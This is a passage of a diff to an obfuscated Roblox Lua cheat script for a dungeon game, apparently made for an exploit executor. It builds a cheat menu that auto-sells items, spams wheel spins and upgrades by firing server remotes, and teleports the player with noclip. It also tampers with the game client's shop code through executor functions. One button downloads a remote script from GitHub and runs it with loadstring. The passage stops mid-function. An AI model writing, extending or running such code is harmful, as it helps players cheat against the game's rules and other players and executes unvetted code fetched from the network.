-    Name = 'Moccasin'
-}, {
-    Hex = '#FFDEAD',
-    Name = 'Navajo White'
-}, {
-    Hex = '#000080',
-    Name = 'Navy'
-}, {
-    Hex = '#FDF5E6',
-    Name = 'Old Lace'
-}, {
-    Hex = '#808000',
-    Name = 'Olive'
-}, {
-    Hex = '#6B8E23',
-    Name = 'Olive Drab'
-}, {
-    Hex = '#FFA500',
-    Name = 'Orange'
-}, {
-    Hex = '#FF4500',
-    Name = 'Orange Red'
-}, {
-    Hex = '#DA70D6',
-    Name = 'Orchid'
-}, {
-    Hex = '#EEE8AA',
-    Name = 'Pale Goldenrod'
-}, {
-    Hex = '#98FB98',
-    Name = 'Pale Green'
-}, {
-    Hex = '#AFEEEE',
-    Name = 'Pale Turquoise'
-}, {
-    Hex = '#DB7093',
-    Name = 'Pale Violet Red'
-}, {
-    Hex = '#FFEFD5',
-    Name = 'Papaya Whip'
-}, {
-    Hex = '#FFDAB9',
-    Name = 'Peach Puff'
-}, {
-    Hex = '#CD853F',
-    Name = 'Peru'
-}, {
-    Hex = '#FFC0CB',
-    Name = 'Pink'
-}, {
-    Hex = '#DDA0DD',
-    Name = 'Plum'
-}, {
-    Hex = '#B0E0E6',
-    Name = 'Powder Blue'
-}, {
-    Hex = '#800080',
-    Name = 'Purple'
-}, {
-    Hex = '#FF0000',
-    Name = 'Red'
-}, {
-    Hex = '#BC8F8F',
-    Name = 'Rosy Brown'
-}, {
-    Hex = '#4169E1',
-    Name = 'Royal Blue'
-}, {
-    Hex = '#8B4513',
-    Name = 'Saddle Brown'
-}, {
-    Hex = '#FA8072',
-    Name = 'Salmon'
-}, {
-    Hex = '#F4A460',
-    Name = 'Sandy Brown'
-}, {
-    Hex = '#2E8B57',
-    Name = 'Sea Green'
-}, {
-    Hex = '#FFF5EE',
-    Name = 'Sea Shell'
-}, {
-    Hex = '#A0522D',
-    Name = 'Sienna'
-}, {
-    Hex = '#C0C0C0',
-    Name = 'Silver'
-}, {
-    Hex = '#87CEEB',
-    Name = 'Sky Blue'
-}, {
-    Hex = '#6A5ACD',
-    Name = 'Slate Blue'
-}, {
-    Hex = '#708090',
-    Name = 'Slate Gray'
-}, {
-    Hex = '#FFFAFA',
-    Name = 'Snow'
-}, {
-    Hex = '#00FF7F',
-    Name = 'Spring Green'
-}, {
-    Hex = '#4682B4',
-    Name = 'Steel Blue'
-}, {
-    Hex = '#D2B48C',
-    Name = 'Tan'
-}, {
-    Hex = '#008080',
-    Name = 'Teal'
-}, {
-    Hex = '#D8BFD8',
-    Name = 'Thistle'
-}, {
-    Hex = '#FF6347',
-    Name = 'Tomato'
-}, {
-    Hex = '#40E0D0',
-    Name = 'Turquoise'
-}, {
-    Hex = '#EE82EE',
-    Name = 'Violet'
-}, {
-    Hex = '#F5DEB3',
-    Name = 'Wheat'
-}, {
-    Hex = '#FFFFFF',
-    Name = 'White'
-}, {
-    Hex = '#F5F5F5',
-    Name = 'White Smoke'
-}, {
-    Hex = '#FFFF00',
-    Name = 'Yellow'
-}, {
-    Hex = '#9ACD32',
-    Name = 'Yellow Green'
-}}
-local cW = {}
-for K, L in cY do
-    table.insert(cW, L.Name)
-end
-table.sort(cW)
-cz:AddDropdown('selectedDyes', {
-    Text = 'Select Desired Dyes',
-    Tooltip = "Event wheel items with these dyes or close to these dyes won't be sold/recycled",
-    Values = cW,
-    AllowNull = true,
-    Default = {'Rainbow', 'Ghoul', 'Ice', 'Faded', 'Black', 'White'},
-    Multi = true
-})
-cz:AddSlider('colorDistanceThreshold', {
-    Text = 'Color Distance Threshold',
-    Tooltip = 'Keep dyes that are close to your desired dyes',
-    Default = 100,
-    Min = 0,
-    Max = 200,
-    Rounding = 0,
-    HideMax = true,
-    Compact = true
-})
-cz:AddToggle('autoSellCosmetics', {
-    Text = 'Auto Sell Cosmetics',
-    Default = false
-})
-Toggles.autoSellCosmetics:OnChanged(function(cM)
-    if cM and Toggles.autoRecycleCosmetics.Value then
-        Toggles.autoRecycleCosmetics:SetValue(false)
+    local function dc(dd)
+        dd = dd:gsub("#", "")
+        return tonumber("0x" .. dd:sub(1, 2)), tonumber("0x" .. dd:sub(3, 4)), tonumber("0x" .. dd:sub(5, 6))
     end
-end)
-cz:AddToggle('autoRecycleCosmetics', {
-    Text = 'Auto Recycle Cosmetics',
-    Default = false
-})
-Toggles.autoRecycleCosmetics:OnChanged(function(cM)
-    if cM and Toggles.autoSellCosmetics.Value then
-        Toggles.autoSellCosmetics:SetValue(false)
+    local function de(df, dg)
+        local dh, di, dj = dc(df)
+        local dk, dl, dm = dc(dg)
+        return math.sqrt((dk - dh) ^ 2 + (dl - di) ^ 2 + (dm - dj) ^ 2)
     end
-end)
-function color3ToHex(color)
-    local ca = math.floor(color.R * 255 + 0.5)
-    local cZ = math.floor(color.G * 255 + 0.5)
-    local c8 = math.floor(color.B * 255 + 0.5)
-    return string.format("#%02X%02X%02X", ca, cZ, c8)
-end
-function hexToRGB(c_)
-    c_ = c_:gsub("#", "")
-    return tonumber("0x" .. c_:sub(1, 2)), tonumber("0x" .. c_:sub(3, 4)), tonumber("0x" .. c_:sub(5, 6))
-end
-function colorDistance(d0, d1)
-    local d2, d3, d4 = hexToRGB(d0)
-    local d5, d6, d7 = hexToRGB(d1)
-    return math.sqrt((d5 - d2) ^ 2 + (d6 - d3) ^ 2 + (d7 - d4) ^ 2)
-end
-function desiredColorCheck(d8)
-    local d9;
-    local da;
-    if d8 and d8:FindFirstChild('Dye') and d8.Dye.Value then
-        da = color3ToHex(d8.Dye.Value)
-        for db, dc in cY do
-            if Options.selectedDyes.Value[dc.Name] then
-                if da == dc.Hex then
-                    d9 = true;
-                    print('Did not sell ' .. d8.Name .. ' - ' .. dc.Name)
-                    break
-                elseif not dc.SpecialType then
-                    local a8 = colorDistance(da, dc.Hex)
-                    if a8 <= Options.colorDistanceThreshold.Value then
-                        d9 = true;
-                        print('Did not sell ' .. d8.Name .. ' - Similar to ' .. dc.Name .. ' - Color Distance: ' ..
-                                  math.floor(a8 / 0.1) / 10 .. ' - Hex: ' .. da)
+    local function dn(dp)
+        local dq;
+        local dr;
+        if dp and dp:FindFirstChild('Dye') and dp.Dye.Value then
+            dr = d7(dp.Dye.Value)
+            for ds, dt in d6 do
+                if Options.selectedDyes.Value[dt.Name] then
+                    if dr == dt.Hex then
+                        dq = true;
+                        print('Did not sell ' .. dp.Name .. ' - ' .. dt.Name)
                         break
-                    end
-                end
-            end
-        end
-    end
-    if d9 then
-        return true
-    end
-end
-cz:AddButton({
-    Text = 'Sell Selected Cosmetics',
-    Func = function()
-        local cQ = {}
-        for K, L in bF:GetChildren() do
-            local dd = cV[L.Name] or cX[L.Name] or 'none'
-            if (Options.selectedCosmetics.Value[dd] or Options.selectedWheelCosmetics.Value[dd]) and
-                not L:FindFirstChild('Locked') and not desiredColorCheck(L) then
-                table.insert(cQ, L)
-            end
-        end
-        if #cQ > 0 then
-            libNoti('Sold ' .. #cQ .. ' Cosmetics')
-            sell(cQ)
-        end
-    end,
-    DoubleClick = true
-})
-cz:AddButton({
-    Text = 'Recycle Selected Cosmetics',
-    Func = function()
-        local cQ = {}
-        for K, L in bF:GetChildren() do
-            local dd = cV[L.Name] or cX[L.Name] or 'none'
-            if (Options.selectedCosmetics.Value[dd] or Options.selectedWheelCosmetics.Value[dd]) and
-                not L:FindFirstChild('Locked') and not desiredColorCheck(L) then
-                table.insert(cQ, L)
-            end
-        end
-        if #cQ > 0 then
-            libNoti('Recycled ' .. #cQ .. ' Cosmetics')
-            recycle(cQ)
-        end
-    end,
-    DoubleClick = true
-})
-if ay then
-    bF.ChildAdded:Connect(function(L)
-        if Toggles.autoSellCosmetics.Value or Toggles.autoRecycleCosmetics.Value then
-            local dd = cX[L.Name]
-            if dd then
-                L:WaitForChild('Dye', 5)
-                if Options.selectedWheelCosmetics.Value[dd] and not L:FindFirstChild('Locked') and
-                    not desiredColorCheck(L) then
-                    if Toggles.autoSellCosmetics.Value then
-                        sell({L})
-                    end
-                    if Toggles.autoRecycleCosmetics.Value then
-                        recycle({L})
-                    end
-                end
-            end
-        end
-    end)
-    bE.ChildAdded:Connect(function(L)
-        if Toggles.autoSellEggs.Value then
-            local d8 = bJ[L.Name]
-            if d8.Type == 'Egg' then
-                sell({L})
-            end
-        end
-    end)
-end
-cB:AddInput('wheelCount', {
-    Default = 100,
-    Numeric = true,
-    Finished = true,
-    Text = 'Wheel Spin Count'
-})
-cB:AddSlider('wheelDelay', {
-    Text = 'Wheel Spin Delay',
-    Tooltip = 'Keep dyes that are close to your desired dyes',
-    Default = 0,
-    Min = 0,
-    Max = 5,
-    Rounding = 1,
-    HideMax = true,
-    Compact = true
-})
-local de = cB:AddLabel(Options.wheelCount.Value .. ' spins in ' ..
-                           timeElapsed(math.round((Options.wheelCount.Value - 1) * Options.wheelDelay.Value * 10) / 10))
-Options.wheelCount:OnChanged(function(cM)
-    de:SetText(cM .. ' spins in ' .. timeElapsed(math.round((cM - 1) * Options.wheelDelay.Value * 10) / 10))
-end)
-Options.wheelDelay:OnChanged(function(cM)
-    de:SetText(Options.wheelCount.Value .. ' spins in ' ..
-                   timeElapsed(math.round((Options.wheelCount.Value - 1) * cM * 10) / 10))
-end)
-cB:AddButton({
-    Text = 'Spin wheel with the settings above!',
-    Func = function()
-        local df, dg = tonumber(Options.wheelCount.Value), Options.wheelDelay.Value;
-        if df > 0 then
-            libNoti('Spinning the wheel ' .. df .. ' times in ' .. timeElapsed(math.round((df - 1) * dg * 10) / 10) ..
-                        ' seconds!', 7)
-            for K = 1, df do
-                _.EventSpinner.JoinQueue:FireServer(c)
-                task.wait(dg)
-            end
-        end
-    end,
-    DoubleClick = true
-})
-function PlayerTp(x, c9, dh, di)
-    if alive() then
-        aO.CFrame = CFrame.new(x + Vector3.new(c9, dh, di))
-    end
-end
-function SmartPlayerTp(bq, dj)
-    if not alive() then
-        return
-    end
-    noclip()
-    aO.Velocity = Vector3.new()
-    if aN:FindFirstChild("Collider") then
-        aN.Collider.Velocity = Vector3.new()
-    end
-    if dj then
-        aO.CFrame = CFrame.lookAt(bq.Position, Vector3.new(dj.Position.x, bq.Position.y, dj.Position.z))
-    else
-        aO.CFrame = bq
-    end
-end
-cD:AddToggle('NVD', {
-    Text = 'No Visual Damage',
-    Default = true
-})
-cD:AddToggle('rendering', {
-    Text = 'Disable 3D Rendering',
-    Default = false
-})
-Toggles.rendering:OnChanged(function(cc)
-    cloneref(game:GetService("RunService")):Set3dRenderingEnabled(not cc)
-end)
-cD:AddToggle('autoHide', {
-    Text = 'Hide GUI On Execution',
-    Default = false
-})
-cF:AddButton({
-    Text = 'Upgrade Equipped Items',
-    Func = function()
-        local dk = {aZ:GetChildren()[1], a_:GetChildren()[1], b0:GetChildren()[1]}
-        for db, dl in dk do
-            task.spawn(function()
-                if dl and dl:FindFirstChild('UpgradeLimit') and dl.UpgradeLimit.Value ~= 0 then
-                    local dm = aV.Value;
-                    local dn = tick()
-                    while task.wait(0.1) do
-                        if dl:FindFirstChild('Upgrade') and dl.Upgrade.Value == dl.UpgradeLimit.Value then
+                    elseif not dt.SpecialType then
+                        local _ = de(dr, dt.Hex)
+                        if _ <= Options.colorDistanceThreshold.Value then
+                            dq = true;
+                            print('Did not sell ' .. dp.Name .. ' - Similar to ' .. dt.Name .. ' - Color Distance: ' ..
+                                      math.floor(_ / 0.1) / 10 .. ' - Hex: ' .. dr)
                             break
-                        else
-                            b1:FireServer(dl)
-                            if aV.Value ~= dm then
-                                dm = aV.Value;
-                                dn = tick()
-                            end
-                            if tick() - dn >= 2 then
-                                break
-                            end
                         end
                     end
                 end
-            end)
-        end
-    end,
-    DoubleClick = true
-})
-cF:AddButton({
-    Text = 'Discover Dungeons (BLATANT)',
-    Func = function()
-        if alive() and not aw then
-            local dp = Workspace.PhysicalDungeonLocations;
-            for K, L in dp:GetChildren() do
-                _.Teleport.WaystoneTeleport:FireServer(1)
-                aO:GetPropertyChangedSignal("Position"):Once(function()
-                    PlayerTp(L.Ring.Position, 0, 10, 0)
-                end)
-                wait(1)
             end
         end
-    end,
-    DoubleClick = true
-})
-local dq = false;
-if olympus then
-    cF:AddButton({
-        Text = 'Dex Explorer',
+        if dq then
+            return true
+        end
+    end
+    cH:AddButton({
+        Text = 'Sell Selected Cosmetics',
         Func = function()
-            if not dq then
-                dq = true;
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+            local cZ = {}
+            for B, C in pairs(bG:GetChildren()) do
+                local du = d3[C.Name] or d5[C.Name] or 'none'
+                if (Options.selectedCosmetics.Value[du] or Options.selectedWheelCosmetics.Value[du]) and
+                    not C:FindFirstChild('Locked') and not dn(C) then
+                    table.insert(cZ, C)
+                end
+            end
+            if #cZ > 0 then
+                cq('Sold ' .. #cZ .. ' Cosmetics')
+                sell(cZ)
+            end
+        end,
+        DoubleClick = true
+    })
+    cH:AddButton({
+        Text = 'Recycle Selected Cosmetics',
+        Func = function()
+            local cZ = {}
+            for B, C in pairs(bG:GetChildren()) do
+                local du = d3[C.Name] or d5[C.Name] or 'none'
+                if (Options.selectedCosmetics.Value[du] or Options.selectedWheelCosmetics.Value[du]) and
+                    not C:FindFirstChild('Locked') and not dn(C) then
+                    table.insert(cZ, C)
+                end
+            end
+            if #cZ > 0 then
+                cq('Recycled ' .. #cZ .. ' Cosmetics')
+                recycle(cZ)
+            end
+        end,
+        DoubleClick = true
+    })
+    if aq then
+        bG.ChildAdded:Connect(function(C)
+            if Toggles.autoSellCosmetics.Value or Toggles.autoRecycleCosmetics.Value then
+                local du = d5[C.Name]
+                if du then
+                    C:WaitForChild('Dye', 5)
+                    if Options.selectedWheelCosmetics.Value[du] and not C:FindFirstChild('Locked') and not dn(C) then
+                        if Toggles.autoSellCosmetics.Value then
+                            sell({C})
+                        end
+                        if Toggles.autoRecycleCosmetics.Value then
+                            recycle({C})
+                        end
+                    end
+                end
+            end
+        end)
+        bF.ChildAdded:Connect(function(C)
+            if Toggles.autoSellEggs.Value then
+                local dp = bL[C.Name]
+                if dp.Type == 'Egg' then
+                    sell({C})
+                end
+            end
+        end)
+    end
+end
+do
+    cJ:AddInput('wheelCount', {
+        Default = 100,
+        Numeric = true,
+        Finished = true,
+        Text = 'Wheel Spin Count'
+    })
+    cJ:AddSlider('wheelDelay', {
+        Text = 'Wheel Spin Delay',
+        Tooltip = 'Keep dyes that are close to your desired dyes',
+        Default = 0,
+        Min = 0,
+        Max = 5,
+        Rounding = 1,
+        HideMax = true,
+        Compact = true
+    })
+    local dv = cJ:AddLabel(Options.wheelCount.Value .. ' spins in ' ..
+                               timeElapsed(
+            math.round((Options.wheelCount.Value - 1) * Options.wheelDelay.Value * 10) / 10))
+    Options.wheelCount:OnChanged(function(cU)
+        dv:SetText(cU .. ' spins in ' .. timeElapsed(math.round((cU - 1) * Options.wheelDelay.Value * 10) / 10))
+    end)
+    Options.wheelDelay:OnChanged(function(cU)
+        dv:SetText(Options.wheelCount.Value .. ' spins in ' ..
+                       timeElapsed(math.round((Options.wheelCount.Value - 1) * cU * 10) / 10))
+    end)
+    cJ:AddButton({
+        Text = 'Spin wheel with the settings above!',
+        Func = function()
+            local dw, dx = tonumber(Options.wheelCount.Value), Options.wheelDelay.Value;
+            if dw > 0 then
+                cq('Spinning the wheel ' .. dw .. ' times in ' .. timeElapsed(math.round((dw - 1) * dx * 10) / 10) ..
+                       ' seconds!', 7)
+                for B = 1, dw do
+                    S.EventSpinner.JoinQueue:FireServer(c)
+                    task.wait(dx)
+                end
             end
         end,
         DoubleClick = true
     })
 end
-local dr = 7;
-local ds = {
-    Bank = {
-        DisplayName = 'Bank',
-        CodeName = 'Bank',
-        OrderId = 1
-    },
-    ZeroAltar = {
-        DisplayName = 'Zero Altar',
-        CodeName = 'Fusion',
-        OrderId = 2
-    },
-    UpgradeMenu = {
-        DisplayName = 'Upgrade',
-        CodeName = 'ItemUpgrade',
-        OrderId = 3
-    },
-    DungeonMenu = {
-        DisplayName = 'Dungeon Menu',
-        CodeName = 'MissionSelect',
-        OrderId = 4
-    },
-    Inventory = {
-        DisplayName = 'Inventory',
-        CodeName = 'Inventory',
-        OrderId = 5
-    },
-    Recycler = {
-        DisplayName = 'Recycler',
-        CodeName = 'Recycler',
-        OrderId = 6
-    },
-    AdminItemPanel = {
-        DisplayName = 'Admin Item Panel',
-        CodeName = 'AdminItemPanel',
-        OrderId = 7
-    }
-}
-function OpenGui(x)
-    setthreadcontext(2)
-    require(Z.Client.Gui):Get(x):Open()
-end
-for K = 1, dr do
-    for dt, du in ds do
-        if du.OrderId == K then
-            cG:AddButton({
-                Text = du.DisplayName,
-                Func = function()
-                    OpenGui(du.CodeName)
-                end,
-                DoubleClick = false
-            })
-        end
-    end
-end
-cG:AddInput('marketFilter', {
-    Numeric = false,
-    Finished = true,
-    Text = 'Market Filter'
-})
-cG:AddButton({
-    Text = 'Open All Markets',
-    Func = function()
-        task.spawn(function()
-            setthreadcontext(2)
-            local dv = require(game.ReplicatedStorage.Client.Gui):Get("Shop")
-            local dw = getfenv(dv.Open).BuildShop;
-            pcall(dv.Open, dv, game)
-            for K, L in getupvalue(dw, 1) do
-                L:Destroy()
-            end
-            for K, L in getupvalue(dw, 2) do
-                L:Disconnect()
-            end
-            local dx = {}
-            local dy = {}
-            local dz = Z:WaitForChild("PlayerShops")
-            for K, dA in b:GetPlayers() do
-                local dB = dz:FindFirstChild(dA.Name) and dz[dA.Name]:FindFirstChild("SellShop")
-                if dB and dB:FindFirstChild("Active") and dB.Active.Value then
-                    setupvalue(dw, 1, {})
-                    setupvalue(dw, 2, {})
-                    dw(dA)
-                    for K, L in getupvalue(dw, 1) do
-                        L.Title.Text = L.Title.Text .. " (" .. dA.Name .. ")"
-                        L.Title.Overlay.Text = L.Title.Text;
-                        table.insert(dx, L)
-                    end
-                    for K, L in getupvalue(dw, 2) do
-                        table.insert(dy, L)
-                    end
-                end
-            end
-            if Options.marketFilter.Value and #Options.marketFilter.Value > 0 then
-                for K, L in dx do
-                    if not L.Title.Text:lower():find(Options.marketFilter.Value:lower()) then
-                        L:Destroy()
-                    end
-                end
-            end
-            table.sort(dx, function(dC, c8)
-                local dD =
-                    dC:FindFirstChild('Cost') and dC.Cost:FindFirstChild('Overlay') and #dC.Cost.Overlay.Text > 0 and
-                        dC.Cost.Overlay.Text:gsub(",", "") and tonumber(dC.Cost.Overlay.Text:gsub(",", "")) or 0;
-                local dE =
-                    c8:FindFirstChild('Cost') and c8.Cost:FindFirstChild('Overlay') and #c8.Cost.Overlay.Text > 0 and
-                        c8.Cost.Overlay.Text:gsub(",", "") and tonumber(c8.Cost.Overlay.Text:gsub(",", "")) or 0;
-                return dD > dE
-            end)
-            setupvalue(dw, 1, dx)
-            setupvalue(dw, 2, dy)
-            getupvalue(dv.Init, 1).Title.Text = "All Shops"
-            getupvalue(dv.Init, 1).Title.Overlay.Text = "All Shops"
-        end)
-    end,
-    DoubleClick = false
-})
-local dF = cI:AddLabel('Gold Gain: ' .. aV.Value - aW)
-local dG = cI:AddLabel('Gold Rate: N/A')
-local dH = true;
-g = tick()
-local dI;
-local dJ;
-local dK = false;
-local dL = cI:AddLabel('Total Gold: ' .. formatNumberWithCommas(aV.Value))
-local dM = cI:AddLabel('Session Time: 0s')
-cI:AddDivider()
-local dN = ai.CrossSessionTimestamp or tick()
-local dO = cI:AddLabel('Cross-Session Time: ' .. timeElapsed(tick() - dN))
-local dP =
-    cI:AddLabel('CS Gold Gain: ' .. formatNumberWithCommas(ai.CrossSessionGold and aX - ai.CrossSessionGold or 0))
-local dQ = ai.CrossSessionGold or aX;
-cI:AddButton({
-    Text = 'Reset Cross-Session Time',
-    Func = function()
-        dN = tick()
-        ai.CrossSessionTimestamp = dN;
-        save()
-    end,
-    DoubleClick = true
-})
-cI:AddButton({
-    Text = 'Reset Cross-Session Gold',
-    Func = function()
-        dQ = aX;
-        ai.CrossSessionGold = dQ;
-        save()
-        dP:SetText('CS Gold Gain: 0')
-    end,
-    DoubleClick = true
-})
-local dR;
-if not ai.CrossSessionTimestamp then
-    ai.CrossSessionTimestamp = dN;
-    dR = true
-end
-if not ai.CrossSessionGold then
-    ai.CrossSessionGold = dQ;
-    dR = true
-end
-if dR then
-    save()
-end
-task.spawn(function()
-    while true do
-        if aV.Value ~= aX then
-            aX = aV.Value;
-            if not dH then
-                dG:SetText('Gold Rate: ' .. math.floor((aX - dJ) / (tick() - dI) * 600) / 10 .. '/min')
-            end
-            if dH then
-                dH = false;
-                dK = true;
-                dI = tick()
-                dJ = aX
-            end
-            dF:SetText('Gold Gained: ' .. formatNumberWithCommas(aX - aW))
-            dL:SetText('Total Gold: ' .. formatNumberWithCommas(aX))
-            dP:SetText('CS Gold Gain: ' .. formatNumberWithCommas(aX - dQ))
-        end
-        task.wait()
-    end
-end)
-task.spawn(function()
-    while true do
-        task.wait(1)
-        dM:SetText('Session Time: ' .. timeElapsed(tick() - g))
-        dO:SetText('Cross-Session Time: ' .. timeElapsed(tick() - dN))
-    end
-end)
-for K = 1, c3 do
-    for dt, dS in c4 do
-        if dS.OrderId == K then
-            cJ:AddButton({
-                Text = dS.Name,
-                Func = function()
-                    _.Teleport.TeleportToHub:FireServer(dS.Id)
-                end,
-                DoubleClick = false
-            })
-        end
-    end
-end
-for K, L in au do
-    cK:AddButton({
-        Text = bG[L].NameTag .. ' T' .. K,
-        Func = function()
-            StartRaid(L)
-        end,
-        DoubleClick = false
-    })
-end
-for K, L in av do
-    cL:AddButton({
-        Text = string.gsub(bG[L].NameTag, '%(NIGHTMARE%) ', '') .. ' ' .. bG[L].DisplayWorldID .. '-' ..
-            bG[L].WorldMissionID,
-        Func = function()
-            StartRaid(L, Toggles.ChallengeMode.Value and 5 or 1)
-        end,
-        DoubleClick = false
-    })
-end
-cL:AddToggle('ChallengeMode', {
-    Text = 'Challenge Mode',
-    Default = true
-})
-local dT = Vector3.new(0, 500, 0)
-local dU = Vector3.new()
-local dV;
-local dW;
 do
-    function isKrakenArm(dX)
-        return dX:lower():find('kraken-arm') or dX:lower():find('krakenarm')
+    function PlayerTp(o, dy, dz, dA)
+        if alive() then
+            aG.CFrame = CFrame.new(o + Vector3.new(dy, dz, dA))
+        end
     end
+    function SmartPlayerTp(bq, dB)
+        if not alive() then
+            return
+        end
+        noclip()
+        aG.Velocity = Vector3.new()
+        if aF:FindFirstChild("Collider") then
+            aF.Collider.Velocity = Vector3.new()
+        end
+        if dB then
+            aG.CFrame = CFrame.lookAt(bq.Position, Vector3.new(dB.Position.x, bq.Position.y, dB.Position.z))
+        else
+            aG.CFrame = bq
+        end
+    end
+    cL:AddToggle('NVD', {
+        Text = 'No Visual Damage',
+        Default = true
+    })
+    cL:AddToggle('rendering', {
+        Text = 'Disable 3D Rendering',
+        Default = false
+    })
+    Toggles.rendering:OnChanged(function(cV)
+        cloneref(game:GetService("RunService")):Set3dRenderingEnabled(not cV)
+    end)
+    cL:AddToggle('autoHide', {
+        Text = 'Hide GUI On Execution',
+        Default = false
+    })
+    cN:AddButton({
+        Text = 'Upgrade Equipped Items',
+        Func = function()
+            local dC = {aT:GetChildren()[1], aU:GetChildren()[1], aV:GetChildren()[1]}
+            for ds, dD in dC do
+                task.spawn(function()
+                    if dD and dD:FindFirstChild('UpgradeLimit') and dD.UpgradeLimit.Value ~= 0 then
+                        local dE = aP.Value;
+                        local dF = tick()
+                        while task.wait(0.1) do
+                            if dD:FindFirstChild('Upgrade') and dD.Upgrade.Value == dD.UpgradeLimit.Value then
+                                break
+                            else
+                                aW:FireServer(dD)
+                                if aP.Value ~= dE then
+                                    dE = aP.Value;
+                                    dF = tick()
+                                end
+                                if tick() - dF >= 2 then
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end,
+        DoubleClick = true
+    })
+    cN:AddButton({
+        Text = 'Discover Dungeons (BLATANT)',
+        Func = function()
+            if alive() and not ao then
+                local dG = Workspace.PhysicalDungeonLocations;
+                for B, C in pairs(dG:GetChildren()) do
+                    S.Teleport.WaystoneTeleport:FireServer(1)
+                    aG:GetPropertyChangedSignal("Position"):Once(function()
+                        PlayerTp(C.Ring.Position, 0, 10, 0)
+                    end)
+                    wait(1)
+                end
+            end
+        end,
+        DoubleClick = true
+    })
+    local dH = false;
+    local dI = true;
+    if olympus then
+        cN:AddButton({
+            Text = 'Dex Explorer',
+            Func = function()
+                if not dH then
+                    dH = true;
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+                end
+            end,
+            DoubleClick = true
+        })
+    end
+end
+do
+    local dJ = 7;
+    local dK = {
+        Bank = {
+            DisplayName = 'Bank',
+            CodeName = 'Bank',
+            OrderId = 1
+        },
+        ZeroAltar = {
+            DisplayName = 'Zero Altar',
+            CodeName = 'Fusion',
+            OrderId = 2
+        },
+        UpgradeMenu = {
+            DisplayName = 'Upgrade',
+            CodeName = 'ItemUpgrade',
+            OrderId = 3
+        },
+        DungeonMenu = {
+            DisplayName = 'Dungeon Menu',
+            CodeName = 'MissionSelect',
+            OrderId = 4
+        },
+        Inventory = {
+            DisplayName = 'Inventory',
+            CodeName = 'Inventory',
+            OrderId = 5
+        },
+        Recycler = {
+            DisplayName = 'Recycler',
+            CodeName = 'Recycler',
+            OrderId = 6
+        },
+        AdminItemPanel = {
+            DisplayName = 'Admin Item Panel',
+            CodeName = 'AdminItemPanel',
+            OrderId = 7
+        }
+    }
+    local function dL(o)
+        setthreadcontext(2)
+        require(R.Client.Gui):Get(o):Open()
+    end
+    for B = 1, dJ do
+        for dM, dN in pairs(dK) do
+            if dN.OrderId == B then
+                cO:AddButton({
+                    Text = dN.DisplayName,
+                    Func = function()
+                        dL(dN.CodeName)
+                    end,
+                    DoubleClick = false
+                })
+            end
+        end
+    end
+    cO:AddInput('marketFilter', {
+        Numeric = false,
+        Finished = true,
+        Text = 'Market Filter'
+    })
+    cO:AddButton({
+        Text = 'Open All Markets',
+        Func = function()
+            task.spawn(function()
+                setthreadcontext(2)
+                local dO = require(game.ReplicatedStorage.Client.Gui):Get("Shop")
+                local dP = getfenv(dO.Open).BuildShop;
+                pcall(dO.Open, dO, game)
+                for B, C in pairs(getupvalue(dP, 1)) do
+                    C:Destroy()
+                end
+                for B, C in pairs(getupvalue(dP, 2)) do
+                    C:Disconnect()
+                end
+                local dQ = {}
+                local dR = {}
+                local dS = R:WaitForChild("PlayerShops")
+                for B, dT in pairs(b:GetPlayers()) do
+                    local dU = dS:FindFirstChild(dT.Name) and dS[dT.Name]:FindFirstChild("SellShop")
+                    if dU and dU:FindFirstChild("Active") and dU.Active.Value then
+                        setupvalue(dP, 1, {})
+                        setupvalue(dP, 2, {})
+                        dP(dT)
+                        for B, C in pairs(getupvalue(dP, 1)) do
+                            C.Title.Text = C.Title.Text .. " (" .. dT.Name .. ")"
+                            C.Title.Overlay.Text = C.Title.Text;
+                            table.insert(dQ, C)
+                        end
+                        for B, C in pairs(getupvalue(dP, 2)) do
+                            table.insert(dR, C)
+                        end
+                    end
+                end
+                if Options.marketFilter.Value and #Options.marketFilter.Value > 0 then
+                    for B, C in pairs(dQ) do
+                        if not C.Title.Text:lower():find(Options.marketFilter.Value:lower()) then
+                            C:Destroy()
+                        end
+                    end
+                end
+                table.sort(dQ, function(dV, db)
+                    local dW =
+                        dV:FindFirstChild('Cost') and dV.Cost:FindFirstChild('Overlay') and #dV.Cost.Overlay.Text > 0 and
+                            dV.Cost.Overlay.Text:gsub(",", "") and tonumber(dV.Cost.Overlay.Text:gsub(",", "")) or 0;
+                    local dX =
+                        db:FindFirstChild('Cost') and db.Cost:FindFirstChild('Overlay') and #db.Cost.Overlay.Text > 0 and
+                            db.Cost.Overlay.Text:gsub(",", "") and tonumber(db.Cost.Overlay.Text:gsub(",", "")) or 0;
+                    return dW > dX
+                end)
+                setupvalue(dP, 1, dQ)
+                setupvalue(dP, 2, dR)
+                getupvalue(dO.Init, 1).Title.Text = "All Shops"
+                getupvalue(dO.Init, 1).Title.Overlay.Text = "All Shops"
+            end)
+        end,
+        DoubleClick = false
+    })
+end
+do
+    local dY = cQ:AddLabel('Gold Gain: ' .. aP.Value - aQ)
+    local dZ = cQ:AddLabel('Gold Rate: N/A')
+    local d_ = true;
+    getgenv().sessionTick = tick()
+    local e0;
+    local e1;
+    local e2 = false;
+    local e3 = cQ:AddLabel('Total Gold: ' .. formatNumberWithCommas(aP.Value))
+    local e4 = cQ:AddLabel('Session Time: 0s')
+    cQ:AddDivider()
+    local e5 = aa.CrossSessionTimestamp or tick()
+    local e6 = cQ:AddLabel('Cross-Session Time: ' .. timeElapsed(tick() - e5))
+    local e7 = cQ:AddLabel('CS Gold Gain: ' ..
+                               formatNumberWithCommas(aa.CrossSessionGold and aR - aa.CrossSessionGold or 0))
+    local e8 = aa.CrossSessionGold or aR;
+    cQ:AddButton({
+        Text = 'Reset Cross-Session Time',
+        Func = function()
+            e5 = tick()
+            aa.CrossSessionTimestamp = e5;
+            save()
+        end,
+        DoubleClick = true
+    })
+    cQ:AddButton({
+        Text = 'Reset Cross-Session Gold',
+        Func = function()
+            e8 = aR;
+            aa.CrossSessionGold = e8;
+            save()
+            e7:SetText('CS Gold Gain: 0')
+        end,
+        DoubleClick = true
+    })
+    local e9;
+    if not aa.CrossSessionTimestamp then
+        aa.CrossSessionTimestamp = e5;
+        e9 = true
+    end
+    if not aa.CrossSessionGold then
+        aa.CrossSessionGold = e8;
+        e9 = true
+    end
+    if e9 then
+        save()
+    end
+    task.spawn(function()
+        while true do
+            if aP.Value ~= aR then
+                aR = aP.Value;
+                if not d_ then
